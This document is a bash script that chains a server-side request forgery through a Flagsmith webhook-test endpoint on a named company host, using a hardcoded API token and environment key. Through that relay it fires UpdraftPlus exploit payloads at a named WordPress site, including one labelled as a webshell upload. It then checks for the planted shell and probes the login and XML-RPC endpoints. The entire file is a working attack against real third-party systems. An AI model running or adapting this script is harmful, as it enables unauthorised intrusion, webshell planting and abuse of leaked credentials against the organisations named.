#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="5c835df901f2674a0788e25484a73eb42be31713"
EKEY="8uLGCkxcX7sfS5GDFvy3Ah"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" \
    -H "User-Agent: $UA" -H "Accept: application/json" \
    -H "Referer: https://flagsmith.koinworks.com/" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TIMEOUT"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Test 1: CVE ping exploit
echo "=== CVE PING ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=02cQ1ZFLTIwMjYtMTA3OTUtTEFCLUJBRC1SU0EtQkxPQ0s%3D0000000000000080jawC5lksslKOx1zulgWwjxdAQGl0B%2BNnTpa1abnh1WH8xAFtQg4aUKgAbP0m17NgcDxVjbJRbgSsIIFW3fiUxPDuHs7JSrAS56P8oKbhGwmgcPLXJZ75WaC0Ih9ml2ko"
echo ""

# Test 2: CVE upload exploit (webshell)
echo "=== CVE UPLOAD ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=updraft_central_receive_message&format=1&key_name=0.central.updraftplus.com&udrpc_message=02cQ1ZFLTIwMjYtMTA3OTUtTEFCLUJBRC1SU0EtQkxPQ0s%3D000000000000026ctLEZlBO3Ev7DGVLTNpYPFjvPcqoGq%2Bk%2BdDGiYNgNhCypk826ZGUbYU1ePb8lIelwwEg6sQe%2FBN7kv4OLI3Dvt02Jc1b57dRrFARxlbxmtrR4zq1jVDo2jOnvaZPd0%2B5sg8%2BXNezlr6sGAMA4%2FeQT3FgrvhJTiU0gW7NjzcGTbOPm2%2FdFHckWD%2B%2F830%2BqZJK9sI4hicI8j13EHO0YXLygASh%2BJi30P2ekcUkPU52pjVl2pRXRDTxP0GtUYhndUmaovFVbqPG5aDdQUs63uiCCn%2FDdFOnIl1wCZbwO%2F574FjlHjikMQkeKcmI%2FMh13%2FETdU%2Frt3Ixdgc%2B1v9s%2BqHHYNfQ74IgHVKEpo8pxsQJX1yD2CjJJrkKHbO%2Fh%2BQSgiS7z6GRHkhUTZWgZFx5VadpFE9ECKNJUwCIZV1MjHT8g3dKKZrcJLtW0lIQ0Hdg7U%2Bylzp7rT5jbtS4d3lajt7dEbyrztJec9bfyF%2Byo5EQzPz%2F1L36KffhMNfPsarNf4CGAsVsadS66%2FyHbBoqGWAzS%2Ftib%2Bc%2FyUlKgG1szD1xC0z%2BEMDsExsIRDw3QbbGiDwigNo2%2Frr1wQcChrX6aruO3bIZgy%2F2dIPhdmomwM3lW%2FKk%3D"
echo ""

# Test 3: Check if webshell was uploaded
echo "=== WEBSHELL CHECK ==="
SSRF "https://koinp2p.com/wp-content/plugins/test-plugin/test-plugin.php"
echo ""

# Test 4: admin-ajax heartbeat comparison
echo "=== HEARTBEAT ==="
SSRF "https://koinp2p.com/wp-admin/admin-ajax.php?action=heartbeat"
echo ""

# Test 5: wp-login reachability
echo "=== WP-LOGIN ==="
SSRF "https://koinp2p.com/wp-login.php"
echo ""

# Test 6: xmlrpc
echo "=== XMLRPC ==="
SSRF "https://koinp2p.com/xmlrpc.php"
echo ""
